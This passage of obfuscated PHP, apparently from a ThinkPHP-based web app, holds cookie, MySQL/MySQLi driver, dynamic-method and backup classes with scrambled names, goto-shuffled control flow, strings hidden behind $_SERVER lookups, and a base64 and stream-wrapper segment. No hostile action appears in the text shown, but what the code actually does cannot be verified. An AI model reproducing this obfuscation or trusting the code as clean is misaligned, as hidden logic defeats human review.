(!$eù…™ÛÍÆ || $eù…™ÛÍÆ[$_SERVER[‡’¶øåüç˜][1087]]) { return !1; } return parent::remove($Dù‹Ÿ»ØŠ¼); } public function sort($d¯˜™Ôõ­å, $EÖ‘ô‡¬—) { return parent::update($d¯˜™Ôõ­å, $EÖ‘ô‡¬—); } public function enable($C À±…º³, $E¥¤˜Œ¬) { return parent::update($C À±…º³, array($_SERVER[‡’¶øåüç˜][2510] => $E¥¤˜Œ¬)); } private function initUserOption() { $AäŒÃŞ§¦ =& $_SERVER[‡’¶øåüç˜]; $this->optionType = $AäŒÃŞ§¦[2511]; $this->modelType = $AäŒÃŞ§¦[2512]; $this->field = array($AäŒÃŞ§¦[2513], $AäŒÃŞ§¦[28], $AäŒÃŞ§¦[194], $AäŒÃŞ§¦[29], $AäŒÃŞ§¦[2514], $AäŒÃŞ§¦[695], $AäŒÃŞ§¦[187]); } public function userNoticeGet($cäÁÙÓÒÎ± = false) { $this->initUserOption(); return parent::listData($cäÁÙÓÒÎ±, $_SERVER[‡’¶øåüç˜][371], !0); } public function userNoticeAdd($E‡ª–Ü¬‰¢) { $B†”îî† =& $_SERVER[‡’¶øåüç˜]; $this->initUserOption(); $eœà‘õî§Ö = $this->findByKey($B†”îî†[2513], $E‡ª–Ü¬‰¢[$B†”îî†[371]]); if ($eœà‘õî§Ö) { return !0; } $dŠ„ÚÆ¶õÒ = array($B†”îî†[2513] => $E‡ª–Ü¬‰¢[$B†”îî†[371]], $B†”îî†[28] => $E‡ª–Ü¬‰¢[$B†”îî†[28]], $B†”îî†[194] => $E‡ª–Ü¬‰¢[$B†”îî†[194]], $B†”îî†[29] => isset($E‡ª–Ü¬‰¢[$B†”îî†[29]]) ? $E‡ª–Ü¬‰¢[$B†”îî†[29]] : 1, $B†”îî†[2514] => isset($E‡ª–Ü¬‰¢[$B†”îî†[2514]]) ? $E‡ª–Ü¬‰¢[$B†”îî†[2514]] : 0, $B†”îî†[695] => 0, $B†”îî†[187] => 0); return parent::insert($dŠ„ÚÆ¶õÒ); } public function userNoticeEdit($Eğç¿’¡Îø, $c™´œ…Ï») { $this->initUserOption(); return parent::update($Eğç¿’¡Îø, $c™´œ…Ï»); } } goto Aç´°ŸÈ­; aŠæ‹·¹æî: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($e¦Ú©öÙ = '', $DÉŸğ˜‰óÀ = 0) { if (is_string($e¦Ú©öÙ) && $e¦Ú©öÙ != $_SERVER[‡’¶øåüç˜][33]) { $this->prefix = $e¦Ú©öÙ; } if (is_numeric($DÉŸğ˜‰óÀ) && $DÉŸğ˜‰óÀ > 0) { $this->expire = $DÉŸğ˜‰óÀ; } } public static function getInstance() { static $B¤‚‡¹—¨Í; if ($B¤‚‡¹—¨Í === null) { $B¤‚‡¹—¨Í = new self(); } return $B¤‚‡¹—¨Í; } private static $sameCookieSet = array(); public static function set($bêáËæŒƒØ, $C§Ñ¼ŒÌ˜”, $eäÆë¤¥‹Î = 0, $dóƒ´Ñ´ó = false, $d‡Ê­ËÇË = false) { goto Bôóßî¡Õ; Bôóßî¡Õ: $CÏ…ãìÏÕŞ =& $_SERVER[‡’¶øåüç˜]; if (!$eäÆë¤¥‹Î) { $eäÆë¤¥‹Î = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$bêáËæŒƒØ]) && self::$sameCookieSet[$bêáËæŒƒØ] == $C§Ñ¼ŒÌ˜” . $eäÆë¤¥‹Î) { return; } goto E ææôù­; d¾æ«ä§øò: setcookie($bêáËæŒƒØ, $C§Ñ¼ŒÌ˜”, time() + $eäÆë¤¥‹Î, $CÏ…ãìÏÕŞ[8] . trim($d‡Ê­ËÇË, $CÏ…ãìÏÕŞ[8]) . $aÊ²Ñó½Ñ, !1, !1, $dóƒ´Ñ´ó); goto Dò½Â¢¸İ¡; E ææôù­: self::$sameCookieSet[$bêáËæŒƒØ] = $C§Ñ¼ŒÌ˜” . $eäÆë¤¥‹Î; if (!$d‡Ê­ËÇË) { $d‡Ê­ËÇË = str_replace(HOST, $CÏ…ãìÏÕŞ[33], APP_HOST); $d‡Ê­ËÇË = _get($GLOBALS, $CÏ…ãìÏÕŞ[802], $d‡Ê­ËÇË); } $aÊ²Ñó½Ñ = $CÏ…ãìÏÕŞ[33]; goto d¾æ«ä§øò; Dò½Â¢¸İ¡: } public static function setSafe($D•æßğ¼»À, $F«¬¼»Û˜, $báí¼öƒÒ· = 0) { self::set($D•æßğ¼»À, $F«¬¼»Û˜, $báí¼öƒÒ·, !0); } public static function get($d¥·›¡Óšè) { return isset($_COOKIE[$d¥·›¡Óšè]) ? $_COOKIE[$d¥·›¡Óšè] : !1; } public static function remove($C°Ş¦¹Úˆ½, $eÛ¡İó“¯— = false) { unset($_COOKIE[$C°Ş¦¹Úˆ½]); self::set($C°Ş¦¹Úˆ½, $_SERVER[‡’¶øåüç˜][33], 1, $eÛ¡İó“¯—); } } class DbMysql extends Db { public function __construct($e…Ş­„»§ = '') { $C÷†‹ø† =& $_SERVER[‡’¶øåüç˜]; if (!extension_loaded($C÷†‹ø†[733])) { think_exception(think_lang($C÷†‹ø†[10]) . $C÷†‹ø†[803]); } if (!empty($e…Ş­„»§)) { $this->config = $e…Ş­„»§; if (empty($this->config[$C÷†‹ø†[13]])) { $this->config[$C÷†‹ø†[13]] = $C÷†‹ø†[33]; } } } public function connect($aÓ•‘ÊåÏ™ = '', $F÷ÌÎËÒÈ = 0, $dİ‚Âø¿ = false) { $aó÷±´…ƒ =& $_SERVER[‡’¶øåüç˜]; if (!isset($this->linkID[$F÷ÌÎËÒÈ])) { goto cí˜—…Â•; c±Ï±¤ã°Ú: if (1 != think_config($aó÷±´…ƒ[18])) { unset($this->config); } goto eÈ¬½„†„; cí˜—…Â•: if (empty($aÓ•‘ÊåÏ™)) { $aÓ•‘ÊåÏ™ = $this->config; } $A±ï¶óî´Ã = $aÓ•‘ÊåÏ™[$aó÷±´…ƒ[804]] . ($aÓ•‘ÊåÏ™[$aó÷±´…ƒ[805]] ? "\72{$aÓ•‘ÊåÏ™[$aó÷±´…ƒ[805]]}" : $aó÷±´…ƒ[33]); $e¬À´¾á¹ = !empty($aÓ•‘ÊåÏ™[$aó÷±´…ƒ[13]][$aó÷±´…ƒ[14]]) ? $aÓ•‘ÊåÏ™[$aó÷±´…ƒ[13]][$aó÷±´…ƒ[14]] : $this->pconnect; goto e„¢ìÈ²Ä; Bµˆ¿ÛâÙÅ: mysql_query($aó÷±´…ƒ[808] . think_config($aó÷±´…ƒ[809]) . $aó÷±´…ƒ[55], $this->linkID[$F÷ÌÎËÒÈ]); if ($aµçĞµĞ > $aó÷±´…ƒ[810]) { mysql_query($aó÷±´…ƒ[811], $this->linkID[$F÷ÌÎËÒÈ]); } $this->connected = !0; goto c±Ï±¤ã°Ú; e„¢ìÈ²Ä: if ($e¬À´¾á¹) { $this->linkID[$F÷ÌÎËÒÈ] = mysql_pconnect($A±ï¶óî´Ã, $aÓ•‘ÊåÏ™[$aó÷±´…ƒ[806]], $aÓ•‘ÊåÏ™[$aó÷±´…ƒ[807]], 131072); } else { $this->linkID[$F÷ÌÎËÒÈ] = mysql_connect($A±ï¶óî´Ã, $aÓ•‘ÊåÏ™[$aó÷±´…ƒ[806]], $aÓ•‘ÊåÏ™[$aó÷±´…ƒ[807]], !0, 131072); } if (!$this->linkID[$F÷ÌÎËÒÈ] || !empty($aÓ•‘ÊåÏ™[$aó÷±´…ƒ[17]]) && !mysql_select_db($aÓ•‘ÊåÏ™[$aó÷±´…ƒ[17]], $this->linkID[$F÷ÌÎËÒÈ])) { think_exception(mysql_error()); } $aµçĞµĞ = mysql_get_server_info($this->linkID[$F÷ÌÎËÒÈ]); goto Bµˆ¿ÛâÙÅ; eÈ¬½„†„: } return $this->linkID[$F÷ÌÎËÒÈ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($cùÌ‹Ë¬Ú§) { goto C¹¬ê†Š½É; dÚŞÏ£İÛ®: if (!$this->_linkID) { return !1; } $this->queryStr = $cùÌ‹Ë¬Ú§; if ($this->queryID) { $this->free(); } goto a­ìø‹‰«©; C¹¬ê†Š½É: $díàèä…Ê† =& $_SERVER[‡’¶øåüç˜]; if (0 === stripos($cùÌ‹Ë¬Ú§, $díàèä…Ê†[256])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto dÚŞÏ£İÛ®; a­ìø‹‰«©: think_action_status($díàèä…Ê†[19], 1); think_status($díàèä…Ê†[20]); $this->queryID = mysql_query($cùÌ‹Ë¬Ú§, $this->_linkID); goto D¨µÉÃ–ƒ; D¨µÉÃ–ƒ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto dŒÀ¬¶‚»µ; dŒÀ¬¶‚»µ: } public function execute($B†œé‘Éêé) { goto A¦ƒŒ²Ûè; DŸëîˆæÉ‘: $this->queryStr = $B†œé‘Éêé; if ($this->queryID) { $this->free(); } think_action_status($BŸô´§ ÷Ã[21], 1); goto dñÜËÅË°¿; FÀÉÙ…ò­“: if (!1 === $EØí§õ•«) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto Eµ‚™‹©«‰; dñÜËÅË°¿: think_status($BŸô´§ ÷Ã[20]); $EØí§õ•« = mysql_query($B†œé‘Éêé, $this->_linkID); $this->debug(); goto FÀÉÙ…ò­“; A¦ƒŒ²Ûè: $BŸô´§ ÷Ã =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DŸëîˆæÉ‘; Eµ‚™‹©«‰: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[‡’¶øåüç˜][812], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AŒ½¤¬Èì = mysql_query($_SERVER[‡’¶øåüç˜][813], $this->_linkID); $this->transTimes = 0; if (!$AŒ½¤¬Èì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Eì½ƒÉŒÎÂ = mysql_query($_SERVER[‡’¶øåüç˜][814], $this->_linkID); $this->transTimes = 0; if (!$Eì½ƒÉŒÎÂ) { $this->error(); return !1; } } return !0; } private function getAll() { $EêïóÌÄØá = array(); if ($this->numRows > 0) { while ($d‡„ğ‹ˆ¤¨ = mysql_fetch_assoc($this->queryID)) { $EêïóÌÄØá[] = $d‡„ğ‹ˆ¤¨; } mysql_data_seek($this->queryID, 0); } return $EêïóÌÄØá; } public function getFields($B‹¬ÉŒ‡±±) { $föˆ—àã°  =& $_SERVER[‡’¶øåüç˜]; $cÔÚ«õ¨ = $this->query($föˆ—àã° [815] . $this->parseKey($B‹¬ÉŒ‡±±)); $c”ÏëìŠÈ = array(); if ($cÔÚ«õ¨) { foreach ($cÔÚ«õ¨ as $F²Ù¨óëêí => $CÓ’ˆË‰) { $c”ÏëìŠÈ[$CÓ’ˆË‰[$föˆ—àã° [27]]] = array($föˆ—àã° [28] => $CÓ’ˆË‰[$föˆ—àã° [27]], $föˆ—àã° [29] => $CÓ’ˆË‰[$föˆ—àã° [30]], $föˆ—àã° [31] => (bool) (strtoupper($CÓ’ˆË‰[$föˆ—àã° [32]]) === $föˆ—àã° [816]), $föˆ—àã° [34] => $CÓ’ˆË‰[$föˆ—àã° [35]], $föˆ—àã° [36] => strtolower($CÓ’ˆË‰[$föˆ—àã° [37]]) == $föˆ—àã° [38], $föˆ—àã° [39] => strtolower($CÓ’ˆË‰[$föˆ—àã° [40]]) == $föˆ—àã° [41]); } } return $c”ÏëìŠÈ; } public function getTables($e¤Ÿ÷®Ù¢ƒ = '') { $E‡‹¬­ßÎÂ =& $_SERVER[‡’¶øåüç˜]; if (!empty($e¤Ÿ÷®Ù¢ƒ)) { $aÈ†É”øÁÖ = $E‡‹¬­ßÎÂ[817] . $e¤Ÿ÷®Ù¢ƒ; } else { $aÈ†É”øÁÖ = $E‡‹¬­ßÎÂ[818]; } $cŠ§Â‰Ó¤Œ = $this->query($aÈ†É”øÁÖ); $AùùÚ°‰¨´ = array(); foreach ($cŠ§Â‰Ó¤Œ as $EœìË¿¡È… => $eŒô¥ùœÂî) { $AùùÚ°‰¨´[$EœìË¿¡È…] = current($eŒô¥ùœÂî); } return $AùùÚ°‰¨´; } public function replace($BºÇ¨ì§Ş, $E«éãŠ‡éå = array()) { $cğÏôÀØó¦ =& $_SERVER[‡’¶øåüç˜]; foreach ($BºÇ¨ì§Ş as $cŒ¿‘ÊÇÕÇ => $EÄç ¢ŸÃŞ) { $D‚–À‹ƒ× = $this->parseValue($EÄç ¢ŸÃŞ); if (is_scalar($D‚–À‹ƒ×)) { $dŠ½Ì‡Ê¯à[] = $D‚–À‹ƒ×; $EãƒöĞæá[] = $this->parseKey($cŒ¿‘ÊÇÕÇ); } } $E»˜¾‡‡ó• = $cğÏôÀØó¦[819] . $this->parseTable($E«éãŠ‡éå[$cğÏôÀØó¦[271]]) . $cğÏôÀØó¦[820] . implode($cğÏôÀØó¦[47], $EãƒöĞæá) . $cğÏôÀØó¦[821] . implode($cğÏôÀØó¦[47], $dŠ½Ì‡Ê¯à) . $cğÏôÀØó¦[822]; return $this->execute($E»˜¾‡‡ó•); } public function insertAll($B†²ˆ“Ïæ®, $dÎ¯ÇïÓ‡¸ = array(), $bËòâƒ¡¶¬ = false) { goto eƒöŒ§Ç·¥; eˆõèÃ£åŸ: $Fœù‚Æ…é = ($bËòâƒ¡¶¬ ? $eÎ…Ğ¢™‘õ[824] : $eÎ…Ğ¢™‘õ[825]) . $eÎ…Ğ¢™‘õ[826] . $this->parseTable($dÎ¯ÇïÓ‡¸[$eÎ…Ğ¢™‘õ[271]]) . $eÎ…Ğ¢™‘õ[820] . implode($eÎ…Ğ¢™‘õ[47], $DŠºÕ³œ§) . $eÎ…Ğ¢™‘õ[827] . implode($eÎ…Ğ¢™‘õ[47], $A†Æ›î¦“Î); return $this->execute($Fœù‚Æ…é); goto Dğ„£„îŸæ; eƒöŒ§Ç·¥: $eÎ…Ğ¢™‘õ =& $_SERVER[‡’¶øåüç˜]; if (!is_array($B†²ˆ“Ïæ®[0])) { return !1; } $DŠºÕ³œ§ = array_keys($B†²ˆ“Ïæ®[0]); goto bœŒ”ôğã“; bœŒ”ôğã“: $A†Æ›î¦“Î = array(); foreach ($B†²ˆ“Ïæ® as $FÀ‰ç®ÏÊÛ) { $eàÑ™¹¶Ş³ = array(); foreach ($FÀ‰ç®ÏÊÛ as $e‘—ƒÕãÖª => $Aœºùï‹¥õ) { $Aœºùï‹¥õ = $this->parseValue($Aœºùï‹¥õ); if (is_scalar($Aœºùï‹¥õ)) { $eàÑ™¹¶Ş³[] = $Aœºùï‹¥õ; } } $A†Æ›î¦“Î[] = $eÎ…Ğ¢™‘õ[252] . implode($eÎ…Ğ¢™‘õ[47], $eàÑ™¹¶Ş³) . $eÎ…Ğ¢™‘õ[822]; } array_walk($DŠºÕ³œ§, array($this, $eÎ…Ğ¢™‘õ[823])); goto eˆõèÃ£åŸ; Dğ„£„îŸæ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Dãš¡³‚Ş =& $_SERVER[‡’¶øåüç˜]; $this->error = mysql_errno() . $Dãš¡³‚Ş[4] . mysql_error($this->_linkID); if ($Dãš¡³‚Ş[33] != $this->queryStr) { $this->error .= LNG($Dãš¡³‚Ş[45]) . $this->queryStr; } think_trace($this->error, $Dãš¡³‚Ş[33], $Dãš¡³‚Ş[46]); return $this->error; } public function escapeString($aÃ˜ÆäôÏ) { if ($this->_linkID) { return mysql_real_escape_string($aÃ˜ÆäôÏ, $this->_linkID); } else { return mysql_escape_string($aÃ˜ÆäôÏ); } } public function parseKey(&$C›©ÅìŞÆŸ, $fĞÌˆ¬æ¢í = true) { $dÕ‰¡ğ‘¢İ =& $_SERVER[‡’¶øåüç˜]; if ($fĞÌˆ¬æ¢í) { $C›©ÅìŞÆŸ = $this->parseKeyCheck($C›©ÅìŞÆŸ); } if ($C›©ÅìŞÆŸ != $dÕ‰¡ğ‘¢İ[180] && !preg_match($dÕ‰¡ğ‘¢İ[828], $C›©ÅìŞÆŸ)) { $C›©ÅìŞÆŸ = $dÕ‰¡ğ‘¢İ[829] . trim($C›©ÅìŞÆŸ, $dÕ‰¡ğ‘¢İ[829]) . $dÕ‰¡ğ‘¢İ[829]; } return $C›©ÅìŞÆŸ; } } class DbMysqli extends Db { public function __construct($bğÕñï¹¡‚ = '') { $cîÒ™£—§„ =& $_SERVER[‡’¶øåüç˜]; if (!extension_loaded($cîÒ™£—§„[732])) { think_exception(think_lang($cîÒ™£—§„[10]) . $cîÒ™£—§„[830]); } if (!empty($bğÕñï¹¡‚)) { $this->config = $bğÕñï¹¡‚; if (empty($this->config[$cîÒ™£—§„[13]])) { $this->config[$cîÒ™£—§„[13]] = $cîÒ™£—§„[33]; } } } public function connect($fÊŠØàõè = '', $A“ˆºº‘¡ñ = 0) { $AŸİ‘Ï²ªÛ =& $_SERVER[‡’¶øåüç˜]; if (!isset($this->linkID[$A“ˆºº‘¡ñ])) { goto FìŸìÎÚ±Ó; d”ã¢ğÂâ†: $this->connected = !0; if (1 != think_config($AŸİ‘Ï²ªÛ[18])) { unset($this->config); } goto aÚ†¦¶Ã– ; FìŸìÎÚ±Ó: if (empty($fÊŠØàõè)) { $fÊŠØàõè = $this->config; } $this->linkID[$A“ˆºº‘¡ñ] = new mysqli($fÊŠØàõè[$AŸİ‘Ï²ªÛ[804]], $fÊŠØàõè[$AŸİ‘Ï²ªÛ[806]], $fÊŠØàõè[$AŸİ‘Ï²ªÛ[807]], $fÊŠØàõè[$AŸİ‘Ï²ªÛ[17]], $fÊŠØàõè[$AŸİ‘Ï²ªÛ[805]] ? intval($fÊŠØàõè[$AŸİ‘Ï²ªÛ[805]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto cùˆ‹†ÖèÉ; cùˆ‹†ÖèÉ: $C—±ÒñÚÌ = $this->linkID[$A“ˆºº‘¡ñ]->server_version; $this->linkID[$A“ˆºº‘¡ñ]->query($AŸİ‘Ï²ªÛ[808] . think_config($AŸİ‘Ï²ªÛ[809]) . $AŸİ‘Ï²ªÛ[55]); if ($C—±ÒñÚÌ > $AŸİ‘Ï²ªÛ[810]) { $this->linkID[$A“ˆºº‘¡ñ]->query($AŸİ‘Ï²ªÛ[811]); } goto d”ã¢ğÂâ†; aÚ†¦¶Ã– : } return $this->linkID[$A“ˆºº‘¡ñ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($däÅŒÀÌº°) { goto c‘®›éé; E¹•êáÌÙ: $this->queryStr = $däÅŒÀÌº°; if ($this->queryID) { $this->free(); } think_action_status($aÑÁ‹âµŸø[19], 1); goto B°Ö¿¾Œ¶ê; Aò¡ö¤ã: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto C¶“ñä†í; B°Ö¿¾Œ¶ê: think_status($aÑÁ‹âµŸø[20]); $this->queryID = $this->_linkID->query($däÅŒÀÌº°); if ($this->_linkID->more_results()) { while (($eíÇÙó£—Á = $this->_linkID->next_result()) != NULL) { $eíÇÙó£—Á->free_result(); } } goto Aò¡ö¤ã; c‘®›éé: $aÑÁ‹âµŸø =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E¹•êáÌÙ; C¶“ñä†í: } public function execute($Eƒéîù•Ø…) { goto béÖÌÜƒ·; béÖÌÜƒ·: $e„ªè³ôÀ› =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e½òŒ«‡¬¨; e½òŒ«‡¬¨: $this->queryStr = $Eƒéîù•Ø…; if ($this->queryID) { $this->free(); } think_action_status($e„ªè³ôÀ›[21], 1); goto aù£™ÏøÃ£; aù£™ÏøÃ£: think_status($e„ªè³ôÀ›[20]); $cöÜ¬²Ëàæ = $this->_linkID->query($Eƒéîù•Ø…); $this->debug(); goto C‰ŒØåíæ–; C‰ŒØåíæ–: if (!1 === $cöÜ¬²Ëàæ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto Aé×©ë¬ß; Aé×©ë¬ß: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c¦ù§…«Ö¬ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$c¦ù§…«Ö¬) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÕ¥õ Î® = $this->_linkID->rollback(); $this->transTimes = 0; if (!$CÕ¥õ Î®) { $this->error(); return !1; } } return !0; } private function getAll() { $fÂë¨Ùìâ = array(); if ($this->numRows > 0) { for ($C“ğóô©Ü† = 0; $C“ğóô©Ü† < $this->numRows; $C“ğóô©Ü†++) { $fÂë¨Ùìâ[$C“ğóô©Ü†] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $fÂë¨Ùìâ; } public function getFields($dÙ™Ã²ÇÕ¿) { $bÌŞâëôÇÙ =& $_SERVER[‡’¶øåüç˜]; $b¦”Ï‚Ø˜İ = $this->query($bÌŞâëôÇÙ[815] . $this->parseKey($dÙ™Ã²ÇÕ¿)); $B÷¬ã£äÖÙ = array(); if ($b¦”Ï‚Ø˜İ) { foreach ($b¦”Ï‚Ø˜İ as $A‰–ŒÏõÏï => $bºùÌ¹¯Éç) { $B÷¬ã£äÖÙ[$bºùÌ¹¯Éç[$bÌŞâëôÇÙ[27]]] = array($bÌŞâëôÇÙ[28] => $bºùÌ¹¯Éç[$bÌŞâëôÇÙ[27]], $bÌŞâëôÇÙ[29] => $bºùÌ¹¯Éç[$bÌŞâëôÇÙ[30]], $bÌŞâëôÇÙ[31] => (bool) ($bºùÌ¹¯Éç[$bÌŞâëôÇÙ[32]] === $bÌŞâëôÇÙ[33]), $bÌŞâëôÇÙ[34] => $bºùÌ¹¯Éç[$bÌŞâëôÇÙ[35]], $bÌŞâëôÇÙ[36] => strtolower($bºùÌ¹¯Éç[$bÌŞâëôÇÙ[37]]) == $bÌŞâëôÇÙ[38], $bÌŞâëôÇÙ[39] => strtolower($bºùÌ¹¯Éç[$bÌŞâëôÇÙ[40]]) == $bÌŞâëôÇÙ[41]); } } return $B÷¬ã£äÖÙ; } public function getTables($aÇÂèİš…Ü = '') { $bóŒÈ¶Ì´Š =& $_SERVER[‡’¶øåüç˜]; $F…Á¨…µå¼ = !empty($aÇÂèİš…Ü) ? $bóŒÈ¶Ì´Š[817] . $aÇÂèİš…Ü : $bóŒÈ¶Ì´Š[818]; $D”Š×¨È = $this->query($F…Á¨…µå¼); $EŠÎ„•ßÃÍ = array(); if ($D”Š×¨È) { foreach ($D”Š×¨È as $a›‚–Æïà => $d«®×Êš¶á) { $EŠÎ„•ßÃÍ[$a›‚–Æïà] = current($d«®×Êš¶á); } } return $EŠÎ„•ßÃÍ; } public function replace($e‡É«êŞ˜Í, $F½ÛÚòºÛ­ = array()) { $FÊ‘••õÓö =& $_SERVER[‡’¶øåüç˜]; foreach ($e‡É«êŞ˜Í as $fªÑØëŸÙ => $bù¼‚Õ‰ç») { $fÔ„ããª­ = $this->parseValue($bù¼‚Õ‰ç»); if (is_scalar($fÔ„ããª­)) { $EÉ÷…Ã›ö¶[] = $fÔ„ããª­; $c÷ôÕ­Ó÷°[] = $this->parseKey($fªÑØëŸÙ); } } $C§™ğ²‘Ÿ = $FÊ‘••õÓö[819] . $this->parseTable($F½ÛÚòºÛ­[$FÊ‘••õÓö[271]]) . $FÊ‘••õÓö[820] . implode($FÊ‘••õÓö[47], $c÷ôÕ­Ó÷°) . $FÊ‘••õÓö[821] . implode($FÊ‘••õÓö[47], $EÉ÷…Ã›ö¶) . $FÊ‘••õÓö[822]; return $this->execute($C§™ğ²‘Ÿ); } public function insertAll($d¯âÒâ¹Û, $Eò‚çÈÆ® = array(), $F‘ËÏ°Øå = false) { goto b©Ö¸•ë¨ò; bì§Íæ¥˜‹: $fğïßù×Ñ = array(); foreach ($d¯âÒâ¹Û as $fë°åÆ¡‰Ò) { $Eƒ¢å§¾šè = array(); foreach ($fë°åÆ¡‰Ò as $C¯²¼ƒ¢ => $D„œÌ…‰Éæ) { $D„œÌ…‰Éæ = $this->parseValue($D„œÌ…‰Éæ); if (is_scalar($D„œÌ…‰Éæ)) { $Eƒ¢å§¾šè[] = $D„œÌ…‰Éæ; } } $fğïßù×Ñ[] = $EÀİ˜µÉÛ[252] . implode($EÀİ˜µÉÛ[47], $Eƒ¢å§¾šè) . $EÀİ˜µÉÛ[822]; } array_walk($eğÇˆ‰µÅŞ, array($this, $EÀİ˜µÉÛ[823])); goto DÑ“ÈÃƒ”‘; b©Ö¸•ë¨ò: $EÀİ˜µÉÛ =& $_SERVER[‡’¶øåüç˜]; if (!is_array($d¯âÒâ¹Û[0])) { return !1; } $eğÇˆ‰µÅŞ = array_keys($d¯âÒâ¹Û[0]); goto bì§Íæ¥˜‹; DÑ“ÈÃƒ”‘: $Aé…·Ê×Ö = ($F‘ËÏ°Øå ? $EÀİ˜µÉÛ[824] : $EÀİ˜µÉÛ[825]) . $EÀİ˜µÉÛ[826] . $this->parseTable($Eò‚çÈÆ®[$EÀİ˜µÉÛ[271]]) . $EÀİ˜µÉÛ[820] . implode($EÀİ˜µÉÛ[47], $eğÇˆ‰µÅŞ) . $EÀİ˜µÉÛ[827] . implode($EÀİ˜µÉÛ[47], $fğïßù×Ñ); return $this->execute($Aé…·Ê×Ö); goto bŞ¶™ÄÅ©; bŞ¶™ÄÅ©: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $f¸Ö§†”Éè =& $_SERVER[‡’¶øåüç˜]; $this->error = $this->_linkID->errno . $f¸Ö§†”Éè[4] . $this->_linkID->error; if ($f¸Ö§†”Éè[33] != $this->queryStr) { $this->error .= LNG($f¸Ö§†”Éè[45]) . $this->queryStr; } think_trace($this->error, $f¸Ö§†”Éè[33], $f¸Ö§†”Éè[46]); return $this->error; } public function escapeString($E‰…Ğ¬´ãÁ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($E‰…Ğ¬´ãÁ); } else { return addslashes($E‰…Ğ¬´ãÁ); } } public function parseKey(&$BãÍ­šœ¯, $cƒä„¬Ñàº = true) { $D‘Ü§¥îª =& $_SERVER[‡’¶øåüç˜]; if ($cƒä„¬Ñàº) { $BãÍ­šœ¯ = $this->parseKeyCheck($BãÍ­šœ¯); } if ($BãÍ­šœ¯ != $D‘Ü§¥îª[180] && !preg_match($D‘Ü§¥îª[828], $BãÍ­šœ¯)) { $BãÍ­šœ¯ = $D‘Ü§¥îª[829] . trim($BãÍ­šœ¯, $D‘Ü§¥îª[829]) . $D‘Ü§¥îª[829]; } return $BãÍ­šœ¯; } } goto cÖùôæËÅó; DŒ‘ ÏáÀó: $_SERVER[$_SERVER[úÎ][49]] = (base64_decode('OTk4NQ==').base64_decode('MzM='))+0;$_MBg2="UE728dypVMMCB5xitiIxJtDZIKge36fM4MagkVvPIdPN7PV7ngPvaBt4Tz";; stream_wrapper_register($_SERVER[úÎ][50], $_SERVER[úÎ][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($eÅˆêíƒ, $d…èˆ¦ãàˆ) { $b¨Œ¶Ò¼İâ =& $_SERVER[‡’¶øåüç˜]; if (isset(self::$_methodList[$eÅˆêíƒ])) { return @call_user_func_array(self::$_methodList[$eÅˆêíƒ], $d…èˆ¦ãàˆ); } else { if (method_exists($this, $eÅˆêíƒ)) { return call_user_func_array(array($this, $eÅˆêíƒ), $d…èˆ¦ãàˆ); } else { think_exception(__CLASS__ . $b¨Œ¶Ò¼İâ[4] . $eÅˆêíƒ . $b¨Œ¶Ò¼İâ[5]); } } } public static function __callStatic($e¸’ó¨»ª, $B¬çÉ¼ÅÑ) { if (isset(self::$_methodListStatic[$e¸’ó¨»ª])) { return call_user_func_array(self::$_methodListStatic[$e¸’ó¨»ª], $B¬çÉ¼ÅÑ); } else { if (method_exists(self, $e¸’ó¨»ª)) { return call_user_func_array(array(self, $e¸’ó¨»ª), $B¬çÉ¼ÅÑ); } else { show_json("{$e¸’ó¨»ª}\x28\51\40\156\x6f\x74\40\x65\170\151\x73\x74\x3b", !1); } } } public static function addMethod($AªÙù´Ú¯‰, $dò‰ØôçÂÏ) { self::$_methodList[$AªÙù´Ú¯‰] = $dò‰ØôçÂÏ; } public static function addMethodStatic($d£¬ä³‰ßƒ, $b•ß´ñßŠØ) { self::$_methodListStatic[$d£¬ä³‰ßƒ] = $b•ß´ñßŠØ; } } goto e¶£¤¶á´; d¢ÙçÔ×‹÷: class BackupDbFile { public function __construct() { } public function index() { goto C–âÓÒƒÃµ; C–âÓÒƒÃµ: $FÙÅ°º®Ø´ =& $_SERVER[‡’¶øåüç˜]; $a¸Áµ…¶ = Backup::get(); $Bª¸±ƒ¢†È = $a¸Áµ…¶[$FÙÅ°º®Ø´[28]]; goto C˜ÂàÛ³¬æ; C˜ÂàÛ³¬æ: $fÏÃâ××ê = TEMP_FILES . "\x62\141\x63\153\165\160\x5f{$Bª¸±ƒ¢†È}\57"; $c£‰‘ÈÃƒ = 